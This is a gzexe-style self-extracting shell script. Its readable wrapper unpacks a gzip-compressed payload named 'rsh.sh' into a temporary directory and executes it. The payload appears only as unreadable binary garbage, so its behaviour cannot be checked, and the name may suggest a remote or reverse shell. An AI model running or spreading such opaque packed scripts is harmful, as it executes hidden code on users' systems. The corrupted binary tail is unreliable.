#!/bin/sh
skip=44

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -dt`
else
  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `echo X | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  echo >&2 "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
��4�]rsh.sh �W�r�8}_q�0!t"˲�$�ݶ;�>t&��t��!��[c;��$����@�&�����+霫k�s%iU�d�澂�5�%O�8n�q4�
��>�\�:V*�hEY!Ǳ�`���ӿ?C�e(��Y����1ؿ����ӆ���jgh�t	C���w�O?7���Ɉl���9YY�}��2�%�+���7����U�*i��3�|+�,�<���dJs�b⨻�[��S~����$�B��x�*�3��X�_��
��.^/�� -/�5'qI~��N�᭸ڣ�\/�����/�B�� ,����q����׷��W����R���C�o?�Ĺu�n�̧��.�>�����z���P��NOJ��G9��R�\gis?O�0��&y��q_�<�������t�Β�o�JZ{g`�R�<N}�q��α�3���:�A��Tn�@��s@�\���o��<���/�j���0�O���a�V�c��C�D߇wOa8������+`�%ȥ�_�W=�^�t�YX����p�UU��^nU��Vο��O��\p\ey��Ctܛnm`E�cҋG�d@�!�*ߔS{��/�4��,D'4��c�a.��������BY�"ͥO�l�ɤ��j�v��R��mQr���̋�@���-3��$Hi1���(�i���댞��c3� p� �bL��:ɪ���+�{+�k���Kz��dL-���Q�U��^.�6o��b�����˱.�N���TצEHV��{$���k�Ita԰�b-��$Q������Tv���ЎLi�����vekJqG��D����Ӑ5$���jR�j]�U�c��m\���scѭ��-�m��9j���6�T��N�Y�Ϛ��=��#�(�$��ܚ�G���f��W�н�����7�jpHmM�j�v�������ͨG����I4JT�ͦ":�0�ׁ���~X?ך;��b�V���	9ŐL-�i�&�W�y7  